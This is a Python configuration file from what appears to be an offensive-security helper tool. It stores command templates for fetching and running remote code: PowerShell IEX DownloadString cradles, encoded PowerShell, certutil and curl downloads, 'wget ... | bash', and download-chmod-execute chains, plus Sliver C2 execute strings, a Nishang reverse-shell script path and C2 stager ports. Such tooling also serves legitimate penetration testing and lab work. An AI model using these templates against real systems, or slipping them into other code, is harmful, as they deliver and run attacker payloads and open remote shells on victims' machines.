import os
from configparser import ConfigParser


class Config:
    WINDOWS_BINARIES = '/usr/share/windows-binaries'
    POWERSHELL_TCP = '/opt/nishang/Shells/Invoke-PowerShellTcp.ps1'

    TEMPLATE_POWERSHELL_DOWNLOAD = 'Invoke-WebRequest -Uri {} -OutFile {}'
    TEMPLATE_POWERSHELL_IEX = "IEX(New-Object System.Net.WebClient).DownloadString('{}')"
    TEMPLATE_POWERSHELL_IEX_TEE = "IEX(New-Object System.Net.WebClient).DownloadString('{}') | tee enum-$env:USERNAME-$env:COMPUTERNAME.txt"
    TEMPLATE_POWERSHELL_ENC = 'powershell.exe -enc {}'
    TEMPLATE_SLIVER_POWERSHELL_IEX = """execute -o powershell "IEX(New-Object System.Net.WebClient).DownloadString('{}')\""""
    TEMPLATE_SLIVER_POWERSHELL_IEX_NO_OUTPUT = """execute powershell "IEX(New-Object System.Net.WebClient).DownloadString('{}')\""""
    TEMPLATE_WINDOWS_CURL = 'curl -o {} {}'
    TEMPLATE_CERTUTIL_DOWNOAD = 'certutil.exe -urlcache -split -f {} {}'
    TEMPLATE_WGET_DOWNLOAD = 'wget {} -O {}'
    TEMPLATE_WGET_DOWNLOAD_AND_EXEC = 'wget {} -O {}; chmod u+x {}; {}'
    TEMPLATE_WGET_TO_BASH = 'wget -O - {} | bash'
    TMEPLATE_WEG_TO_BASH_TEE = 'wget -O - {} | bash | tee /tmp/enum-$(whoami)-$(hostname)'

    GIT_UPDATE_DIRECTORIES = [
        '/opt/JAWS', '/opt/linux-smart-enumeration', '/opt/nishang', '/opt/powercat', '/opt/Reconnoitre',
        '/opt/vulscan', '/opt/SUID3NUM'
    ]

    OVERRIDE_IP = None
    PORT = 7999
    SLIVER_MTLS_PORT = 8080
    SLIVER_STAGER_PORT_32 = 8765
    SLIVER_STAGER_PORT_64 = 8766


cfg = Config()
current_folder = os.getcwd()
config_file = os.path.join(current_folder, 'hh_config.txt')

#TODO? think about moving this to the db?
if os.path.exists(config_file):
    parser = ConfigParser()
    parser.read(config_file)
    cfg.OVERRIDE_IP = parser.get('hh', 'OVERRIDE_IP')
